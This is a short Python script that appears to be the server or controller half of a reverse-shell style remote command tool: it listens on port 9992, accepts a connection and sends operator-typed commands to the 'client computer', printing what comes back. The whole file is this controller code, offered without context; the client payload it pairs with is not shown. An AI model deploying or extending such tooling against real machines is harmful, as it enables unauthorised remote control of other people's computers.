import socket
import sys

# Creating Socket
def create_socket():
	try:
		global host
		global port
		global sock

		host = ""
		port = 9992
		sock = socket.socket()
	
	except socket.error as msg:
		print(f"Socket Creating Error : {str(msg)}")
	

# Binding the socket and listening for connections
def bind_socket():
	try:
		global host
		global port
		global sock

		print(f"Binding to Port : {str(port)}")

		sock.bind((host,port))
		sock.listen(5)	
		print("Listening for Connections... ")

	except socket.error as msg:
		print(f"Socket Binding Error : {str(msg)} \nRetrying...")
		bind_socket()
		

# Establishing the connection with client (socket must be listening)

def accept_socket():
	conn,address = sock.accept()
	print(f"Connection Established | IP : {address[0]} Port : {str(address[1])}")
	send_commands(conn)
	conn.close()


# Send Commands to Client Computer

def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			sock.close()
			sys.exit()
		
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response  = str(conn.recv(2048),"utf-8")
			print(client_response,end = "")


def main():
	create_socket()
	bind_socket()
	accept_socket()

main()
